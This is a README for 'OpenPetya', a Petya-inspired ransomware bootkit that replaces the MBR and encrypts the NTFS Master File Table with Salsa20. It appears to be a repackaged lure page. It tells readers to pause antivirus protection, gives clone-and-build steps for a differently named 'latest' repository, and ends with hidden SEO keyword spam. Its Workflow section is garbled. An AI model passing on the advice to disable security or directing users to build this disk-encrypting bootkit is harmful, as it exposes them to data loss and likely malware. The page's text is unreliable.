# OpenPetya


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/DamselTrellis/OpenPetya-latest.git
cd OpenPetya-latest
mkdir build && cd build
cmake ..
cmake --build . --config Release
```


A Proof-of-Concept bootkit inspired by Petya ransomware, written in Assembly, C, and C++

<p align="center">
    <img src="https://iss4cf0ng.github.io/images/meme/Rio/4.png" width=200/>
</p>

If you find this project helpful or informative, I would truly appreciate a ⭐ on the repository. Your support would be a great motivation for me to continue improving this tool.

# Overview

OpenPetya is an educational project designed to study how bootkits and low-level ransomware operate internally.

<p align="center">
    <img src="https://iss4cf0ng.github.io/images/article/2026-5-23-OpenPetya/5.png" width=700/>
</p>

The project focuses on:
- custom MBR bootloading
- multi-stage boot process
- Protected Mode transition
- NTFS Master File Table (MFT) encryption
- Salsa20-based cryptography
- password validation and restoration workflow

OpenPetya is **NOT** intended to be an exact reimplementation of either Petya or NotPetya. Instead, it is a simplified Proof-of-Concept designed for learning and research purposes.

It is worth mentioning that OpenPetya does not include Command-and-Control (C2) functionality. In addition, OpenPetya stores plaintext MFT backup data inside hidden sectors after encryption. This behavior is intentionally designed for educational purposes because those features are relatively trival compared to the core bootloader and cryptographic mechanisms implemented in this project. However, you can still modify or remove these features if necessary.

---

# Project Motivation

Over the past few months, I have been studying:
- malware analysis
- bootloaders
- rootkits and bootkits
- Windows internals
- operating system fundamentals
- low-level Assembly programming

While researching Petya and NotPetya, I realized that many online resources only briefly explain the overall workflow without demonstrating how the underlying boot process actually works.

In addition, many existing Petya-related projects rely on extracted bootloader binaries or modified original components rather than implementing the logic from scratch.

Therefore, I decided to develop OpenPetya as a practical project for understanding:
- how custom MBR bootkits work
- how stage-2 bootloaders operate
- how disk encryption workflows function
- how password validation and restoration mechanisms are implemented

The project also serves as part of my ongoing research into bootkits, low-level malware, and operating system internals.

Related articles:
- [Analyzing Petya](https://iss4cf0ng.github.io/2026/04/12/2026-4-12-Petya/)
- [Analyzing NotPetya](https://iss4cf0ng.github.io/2026/04/13/2026-4-13-NotPetya/)
- [Simple MBR And Bootloader](https://iss4cf0ng.github.io/2026/04/08/2026-4-8-MbrAndBootLoader/)
- [OpenBootloader](https://iss4cf0ng.github.io/2026/05/10/2026-5-10-OpenBootloader/)
- [Rootkits and Bootkits Notes](https://iss4cf0ng.github.io/2026/04/28/2026-4-28-RootkitAndBootkit/)
- [PC Assembly Language Notes](https://iss4cf0ng.github.io/2026/04/21/2026-4-21-PcAsmLang/)
- [Serious Cryptography Notes](https://iss4cf0ng.github.io/2026/05/16/2026-5-16-SeriousCryptography/)

---

# Features

- **Custom MBR**
  
  OpenPetya uses a custom Master Boot Record (MBR) to load the stage-2 payload.

- **Custom Stage-2 Bootloader**
  
  The stage-2 bootloader contains the core functionality of the project, including:
  - Salsa20 encryption/decryption
  - password validation
  - restoration logic
  - user interface

- **Protected Mode Transition**
  
  The bootloader switches from 16-bit Real Mode to 32-bit Protected Mode before executing higher-level logic.

- **MFT Encryption**
  
  Similar to the original Petya, OpenPetya encrypts critical parts of the NTFS Master File Table (MFT) using Salsa20.

- **Password Validation**
  
  OpenPetya validates the input password before decryption to prevent irreversible corruption caused by invalid keys.

- **Automatic Restoration**
  
  Once the correct password is entered:
  - encrypted data is restored
  - the original boot chain is recovered
  - OpenPetya removes itself automatically

---

# Components

## `OpenPetya.exe`

User-mode installer and controller application.

Functions:
- drive selection
- installation
- reboot triggering
- utility interface

## `mbr.bin`

Custom Master Boot Record (MBR) code responsible for:
- stage-2 loading
- early boot execution

## `stage2.bin`

The core payload of OpenPetya.

Responsibilities:
- Protected Mode transition
- Salsa20 cryptographic operations
- MFT encryption/decryption
- password validation
- restoration
- boot-time interface

---

# Workflow

The workflow of OpenPetya is summarized below.

   - encrypted data is decrypted
   - the original boot chain is restored
   - OpenPetya removes itself automatically

> Unlike the original Petya ransomware, OpenPetya does not attempt to deceive users with fake CHKDSK screens or social engineering behavior. The project is designed purely for educational and research purposes.

---


# Technical Notes

Detailed explanations about:
- MBR boot process
- Real Mode and Protected Mode
- Salsa20 implementation
- MFT encryption workflow
- bootkit design
- More discussions about Petya and NotPetya
- How to use undocumented APIs (such as `NtRaiseHardError`)

Are documented in [this article](https://iss4cf0ng.github.io/2026/05/23/2026-5-23-OpenPetya/).

# Disclaimer

This project was developed purely for educational and research purposes.

The goal of OpenPetya is to study:

- bootkits
- operating system internals
- low-level malware techniques
- bootloader architecture

Do **NOT** use this project for illegal activities or against systems you do not own or explicitly have permission to test.

The author is **NOT** responsible for any misuse of this software.

# Demonstration (Windows 7)

## Screenshots

<p align="center">
    <img src="https://iss4cf0ng.github.io/images/article/2026-5-23-OpenPetya/4.png" width=800/>
</p>


# Future Plans

- Improved recovery workflow
- Better NTFS parsing
- More accurate Petya behavior simulation
- UEFI experiments
- Additional bootkit research
- Full-screen Graphics Mode
- Windows 10 support

# Thanks

Thanks for checking out this project. Feedback and suggestions are welcome.

<!-- c++ cpp cmake native performance library framework windows linux macos -->
<!-- OpenPetya-latest - tool utility software - download install setup -->
<!-- how to deploy modern OpenPetya-latest replacement | how to build OpenPetya-latest editor | OpenPetya-latest replacement | download for mac OpenPetya-latest api | how to deploy OpenPetya-latest | stable OpenPetya-latest | source code OpenPetya-latest monitor | OpenPetya-latest validator | start high performance OpenPetya-latest | low latency OpenPetya-latest replacement | quickstart OpenPetya-latest gui | compile OpenPetya-latest optimizer | OpenPetya-latest debugger | free OpenPetya-latest port | open source OpenPetya-latest encoder | OpenPetya-latest analyzer | reliable OpenPetya-latest analyzer | low latency OpenPetya-latest compressor | is OpenPetya latest good | OpenPetya-latest package | OpenPetya-latest sdk | secure OpenPetya-latest analyzer | 2026 OpenPetya-latest desktop | download OpenPetya-latest addon | powerful OpenPetya-latest replacement | top OpenPetya latest | linux OpenPetya-latest plugin | docs OpenPetya-latest | customizable OpenPetya-latest tracker | easy OpenPetya-latest plugin | download top OpenPetya-latest | how to download github OpenPetya-latest | how to build OpenPetya-latest extension | open source OpenPetya-latest clone | windows OpenPetya-latest | use OpenPetya-latest | OpenPetya latest benchmark | online OpenPetya-latest addon | modern OpenPetya-latest copy | best OpenPetya-latest platform | quickstart OpenPetya-latest port | how to install high performance OpenPetya-latest | how to deploy advanced OpenPetya-latest | getting started OpenPetya-latest | updated open source OpenPetya-latest | how to install OpenPetya-latest module | powerful OpenPetya-latest server | free download OpenPetya-latest program | 2026 OpenPetya-latest binding | is OpenPetya latest safe -->
<!-- OpenPetya latest devops | setup secure OpenPetya-latest | github OpenPetya-latest replacement | OpenPetya latest help | open source OpenPetya-latest utility | free OpenPetya-latest viewer | quick start production ready OpenPetya-latest platform | source code configurable OpenPetya-latest analyzer | tutorial reliable OpenPetya-latest | github OpenPetya-latest utility | quick start OpenPetya-latest mobile | use OpenPetya-latest framework | guide OpenPetya-latest gui | how to deploy self hosted OpenPetya-latest addon | OpenPetya latest automation | top OpenPetya-latest client | zip native OpenPetya-latest reader | cross platform OpenPetya-latest | macos OpenPetya-latest | open source OpenPetya-latest monitor | start OpenPetya-latest tracker | run OpenPetya-latest application | how to use OpenPetya-latest cli | safe OpenPetya-latest | compile OpenPetya-latest uploader | lightweight OpenPetya-latest platform | how to configure OpenPetya-latest program | demo secure OpenPetya-latest reader | documentation OpenPetya-latest engine | beginner OpenPetya-latest tool | demo OpenPetya-latest converter | fast OpenPetya-latest generator | deploy OpenPetya-latest mirror | walkthrough OpenPetya-latest api | free download OpenPetya-latest tool | local OpenPetya-latest fork | docs OpenPetya-latest mirror | online OpenPetya-latest port | OpenPetya-latest addon | git clone OpenPetya-latest app | walkthrough safe OpenPetya-latest | documentation OpenPetya-latest package | how to download OpenPetya-latest decoder | build OpenPetya-latest editor | run OpenPetya-latest tester | fast OpenPetya-latest engine | OpenPetya-latest program | download customizable OpenPetya-latest | modern OpenPetya-latest | run on mac OpenPetya-latest platform -->
<!-- run on mac OpenPetya-latest | wiki OpenPetya-latest port | extensible OpenPetya-latest creator | native OpenPetya-latest tracker | local OpenPetya-latest optimizer | native OpenPetya-latest binding | download for linux OpenPetya-latest package | extensible OpenPetya-latest server | simple OpenPetya-latest logger | how to use OpenPetya-latest tester | arch native OpenPetya-latest | execute OpenPetya-latest converter | zip OpenPetya-latest uploader | github OpenPetya-latest extension | setup OpenPetya-latest | run on windows lightweight OpenPetya-latest | source code OpenPetya-latest downloader | OpenPetya latest github | tar.gz OpenPetya-latest | OpenPetya-latest extractor | open source OpenPetya-latest wrapper | deploy OpenPetya-latest wrapper | launch OpenPetya-latest program | updated OpenPetya-latest creator | download for linux OpenPetya-latest editor | self hosted OpenPetya-latest | configure OpenPetya-latest port | free OpenPetya-latest mirror | OpenPetya-latest mobile | open source OpenPetya-latest builder | getting started OpenPetya-latest cli | setup best OpenPetya-latest | execute OpenPetya-latest web | download stable OpenPetya-latest | walkthrough OpenPetya-latest utility | example OpenPetya-latest parser | example OpenPetya-latest api | tutorial OpenPetya-latest sdk | github cross platform OpenPetya-latest | production ready OpenPetya-latest encoder | online OpenPetya-latest analyzer | fast OpenPetya-latest tracker | OpenPetya-latest plugin | run advanced OpenPetya-latest | setup OpenPetya-latest binding | run on linux OpenPetya-latest engine | modular OpenPetya-latest parser | fast OpenPetya-latest builder | start production ready OpenPetya-latest | top OpenPetya-latest fork -->
<!-- OpenPetya latest cloud | OpenPetya-latest viewer | git clone OpenPetya-latest engine | centos OpenPetya-latest desktop | run on linux OpenPetya-latest | open source OpenPetya-latest parser | free OpenPetya latest | start github OpenPetya-latest | portable OpenPetya-latest optimizer | OpenPetya latest handbook | launch reliable OpenPetya-latest | production ready OpenPetya-latest package | 2025 OpenPetya-latest service | wiki OpenPetya-latest binding | build OpenPetya-latest | debian OpenPetya-latest decoder | get OpenPetya-latest api | launch OpenPetya-latest logger | latest version OpenPetya-latest creator | reliable OpenPetya-latest converter | OpenPetya-latest monitor | free OpenPetya-latest library | compile OpenPetya-latest server | modular OpenPetya-latest optimizer | configurable OpenPetya-latest api | free OpenPetya-latest | tar.gz OpenPetya-latest fork | configure local OpenPetya-latest service | new version OpenPetya-latest replacement | run on linux safe OpenPetya-latest | modern OpenPetya-latest editor | offline OpenPetya-latest logger | deploy OpenPetya-latest | tutorial OpenPetya-latest uploader | centos OpenPetya-latest plugin | quickstart OpenPetya-latest binding | docs easy OpenPetya-latest extractor | example open source OpenPetya-latest program | OpenPetya-latest generator | debian OpenPetya-latest fork | compile native OpenPetya-latest | OpenPetya-latest logger | download for linux customizable OpenPetya-latest builder | how to install OpenPetya-latest program | how to download OpenPetya-latest port | use OpenPetya-latest replacement | fast OpenPetya-latest plugin | OpenPetya-latest binding | advanced OpenPetya-latest framework | online OpenPetya-latest tool -->
<!-- latest version offline OpenPetya-latest | run on windows OpenPetya-latest server | how to setup OpenPetya-latest program | updated OpenPetya-latest generator | use OpenPetya-latest decoder | free download OpenPetya-latest reader | run on mac minimal OpenPetya-latest | github easy OpenPetya-latest | native OpenPetya-latest utility | how to install OpenPetya-latest logger | new version OpenPetya-latest server | download for mac top OpenPetya-latest package | OpenPetya-latest compressor | macos OpenPetya-latest package | download for linux high performance OpenPetya-latest alternative | OpenPetya-latest copy | open source OpenPetya-latest plugin | fedora OpenPetya-latest wrapper | OpenPetya latest not working | new version OpenPetya-latest module | download for mac OpenPetya-latest | advanced OpenPetya-latest application | 2025 OpenPetya-latest wrapper | github safe OpenPetya-latest | OpenPetya-latest wrapper | macos OpenPetya-latest builder | extensible OpenPetya-latest software | tutorial OpenPetya-latest | new version OpenPetya-latest | run on mac OpenPetya-latest copy | minimal OpenPetya-latest creator | advanced OpenPetya-latest logger | production ready OpenPetya-latest gui | documentation self hosted OpenPetya-latest | 2026 powerful OpenPetya-latest wrapper | getting started open source OpenPetya-latest | how to deploy OpenPetya-latest mirror | wiki OpenPetya-latest service | free low latency OpenPetya-latest module | extensible OpenPetya-latest checker | download OpenPetya-latest uploader | get OpenPetya-latest binding | fedora OpenPetya-latest converter | 2025 OpenPetya-latest fork | run on windows OpenPetya-latest package | updated OpenPetya-latest program | OpenPetya-latest web | arch OpenPetya-latest alternative | how to install OpenPetya-latest | demo OpenPetya-latest software -->
<!-- configure OpenPetya-latest library | get modern OpenPetya-latest addon | latest version OpenPetya-latest port | download for mac production ready OpenPetya-latest | beginner OpenPetya-latest validator | best OpenPetya-latest | OpenPetya latest reddit | ubuntu OpenPetya-latest logger | OpenPetya-latest library | beginner OpenPetya-latest checker | download for windows lightweight OpenPetya-latest | windows safe OpenPetya-latest | quickstart offline OpenPetya-latest | easy OpenPetya-latest editor | quick start OpenPetya-latest creator | guide OpenPetya-latest builder | high performance OpenPetya-latest monitor | OpenPetya latest setup | install self hosted OpenPetya-latest | docs OpenPetya-latest program | OpenPetya latest reference | download for windows OpenPetya-latest program | cross platform OpenPetya-latest generator | how to run OpenPetya-latest platform | zip open source OpenPetya-latest copy | how to build secure OpenPetya-latest | guide offline OpenPetya-latest | offline OpenPetya-latest clone | how to setup OpenPetya-latest monitor | online OpenPetya-latest | how to setup OpenPetya-latest tracker | OpenPetya-latest uploader | download for windows OpenPetya-latest checker | OpenPetya latest demo | get OpenPetya-latest | ubuntu configurable OpenPetya-latest | latest version OpenPetya-latest monitor | minimal OpenPetya-latest extractor | run best OpenPetya-latest | setup OpenPetya-latest validator | OpenPetya-latest converter | guide high performance OpenPetya-latest software | fedora advanced OpenPetya-latest | execute OpenPetya-latest | advanced OpenPetya-latest creator | centos OpenPetya-latest creator | configure OpenPetya-latest sdk | local OpenPetya-latest program | customizable OpenPetya-latest binding | zip safe OpenPetya-latest -->
<!-- OpenPetya latest guide | getting started OpenPetya-latest plugin | documentation OpenPetya-latest software | quickstart customizable OpenPetya-latest application | run github OpenPetya-latest | fedora OpenPetya-latest decoder | install OpenPetya-latest port | reliable OpenPetya-latest mirror | OpenPetya latest project | quickstart OpenPetya-latest web | easy OpenPetya-latest alternative | open source modern OpenPetya-latest uploader | new version top OpenPetya-latest | download for mac OpenPetya-latest program | top OpenPetya-latest logger | advanced OpenPetya-latest | ubuntu OpenPetya-latest | run OpenPetya-latest downloader | build OpenPetya-latest parser | deploy OpenPetya-latest fork | OpenPetya latest article | OpenPetya latest download | how to run OpenPetya-latest uploader | lightweight OpenPetya-latest | tar.gz easy OpenPetya-latest | sample OpenPetya-latest analyzer | free download OpenPetya-latest mobile | OpenPetya-latest clone | execute OpenPetya-latest tool | get OpenPetya-latest plugin | free stable OpenPetya-latest checker | OpenPetya-latest tracker | OpenPetya-latest checker | start OpenPetya-latest checker | extensible OpenPetya-latest analyzer | top OpenPetya-latest package | advanced OpenPetya-latest sdk | open OpenPetya-latest optimizer | OpenPetya-latest scanner | top OpenPetya-latest downloader | setup modern OpenPetya-latest engine | configure OpenPetya-latest logger | how to download OpenPetya-latest sdk | docs OpenPetya-latest gui | launch OpenPetya-latest generator | top OpenPetya-latest monitor | how to configure OpenPetya-latest fork | OpenPetya latest documentation | walkthrough OpenPetya-latest addon | download for mac OpenPetya-latest tool -->
<!-- 2026 OpenPetya-latest decoder | debian OpenPetya-latest cli | free OpenPetya-latest uploader | modern OpenPetya-latest monitor | OpenPetya latest kubernetes | updated reliable OpenPetya-latest | run on mac secure OpenPetya-latest monitor | best OpenPetya-latest extractor | windows OpenPetya-latest alternative | run on mac portable OpenPetya-latest | customizable OpenPetya-latest | git clone OpenPetya-latest | lightweight OpenPetya-latest addon | OpenPetya latest pipeline | quickstart cross platform OpenPetya-latest module | local OpenPetya-latest mirror | how to build native OpenPetya-latest platform | advanced OpenPetya-latest program | launch modular OpenPetya-latest analyzer | walkthrough OpenPetya-latest web | top OpenPetya-latest service | quickstart OpenPetya-latest tracker | configure OpenPetya-latest application | open source OpenPetya-latest logger | secure OpenPetya-latest downloader | OpenPetya latest test | OpenPetya latest example | easy OpenPetya-latest | github OpenPetya-latest tracker | ubuntu high performance OpenPetya-latest | zip OpenPetya-latest cli | minimal OpenPetya-latest server | github OpenPetya-latest app | OpenPetya latest alternative | modern OpenPetya-latest clone | fedora local OpenPetya-latest module | arch OpenPetya-latest analyzer | run on mac powerful OpenPetya-latest reader | download for mac OpenPetya-latest logger | powerful OpenPetya-latest service | run on mac OpenPetya-latest generator | debian reliable OpenPetya-latest | production ready OpenPetya-latest | windows OpenPetya-latest analyzer | is OpenPetya latest legit | OpenPetya-latest downloader | how to configure OpenPetya-latest | ubuntu OpenPetya-latest fork | OpenPetya-latest client | OpenPetya latest support -->
<!-- secure OpenPetya-latest wrapper | OpenPetya latest course | download for windows free OpenPetya-latest software | offline OpenPetya-latest builder | demo OpenPetya-latest engine | execute OpenPetya-latest cli | quick start OpenPetya-latest wrapper | source code OpenPetya-latest | download OpenPetya-latest application | reliable OpenPetya-latest client | github OpenPetya-latest viewer | arch OpenPetya-latest | lightweight OpenPetya-latest software | minimal OpenPetya-latest | run online OpenPetya-latest | offline OpenPetya-latest compressor | OpenPetya-latest reader | centos OpenPetya-latest module | OpenPetya-latest fork | how to setup stable OpenPetya-latest | modular OpenPetya-latest analyzer | run on mac OpenPetya-latest extractor | example OpenPetya-latest editor | new version OpenPetya-latest clone | OpenPetya latest vs | updated OpenPetya-latest sdk | lightweight OpenPetya-latest optimizer | zip OpenPetya-latest mirror | powerful OpenPetya-latest | production ready OpenPetya-latest software | OpenPetya-latest app | download for linux OpenPetya-latest utility | reliable OpenPetya-latest decoder | portable OpenPetya-latest | OpenPetya latest tutorial | low latency OpenPetya-latest desktop | modern OpenPetya-latest tracker | start OpenPetya-latest binding | OpenPetya latest cheat sheet | download for mac OpenPetya-latest generator | portable OpenPetya-latest platform | start OpenPetya-latest extension | OpenPetya latest bug | install production ready OpenPetya-latest validator | portable OpenPetya-latest library | docs OpenPetya-latest client | how to deploy fast OpenPetya-latest | OpenPetya-latest parser | self hosted OpenPetya-latest debugger | OpenPetya latest podcast -->
<!-- free modern OpenPetya-latest | high performance OpenPetya-latest tool | github OpenPetya-latest software | macos OpenPetya-latest tracker | production ready OpenPetya-latest server | open source OpenPetya-latest | run on windows OpenPetya-latest builder | source code OpenPetya-latest viewer | OpenPetya-latest mirror | self hosted OpenPetya-latest copy | examples OpenPetya-latest debugger | run on windows modular OpenPetya-latest | OpenPetya-latest extension | tar.gz OpenPetya-latest api | setup OpenPetya-latest utility | examples cross platform OpenPetya-latest | linux OpenPetya-latest framework | local OpenPetya-latest service | run on linux OpenPetya-latest tool | launch OpenPetya-latest | best OpenPetya-latest engine | powerful OpenPetya-latest addon | getting started OpenPetya-latest mobile | getting started modular OpenPetya-latest | lightweight OpenPetya-latest viewer | cross platform OpenPetya-latest compressor | lightweight OpenPetya-latest tester | open source OpenPetya-latest validator | new version github OpenPetya-latest viewer | tar.gz native OpenPetya-latest | demo local OpenPetya-latest | portable OpenPetya-latest compressor | ubuntu OpenPetya-latest api | customizable OpenPetya-latest api | OpenPetya-latest cli | configure OpenPetya-latest | OpenPetya latest workflow | free modular OpenPetya-latest | configurable OpenPetya-latest | documentation secure OpenPetya-latest extractor | how to configure OpenPetya-latest converter | customizable OpenPetya-latest viewer | OpenPetya-latest module | download for windows OpenPetya-latest | best OpenPetya-latest app | OpenPetya-latest application | run on windows OpenPetya-latest validator | OpenPetya latest saas | extensible OpenPetya-latest extractor | getting started native OpenPetya-latest -->

<!-- Last updated: 2026-06-09 18:16:34 -->
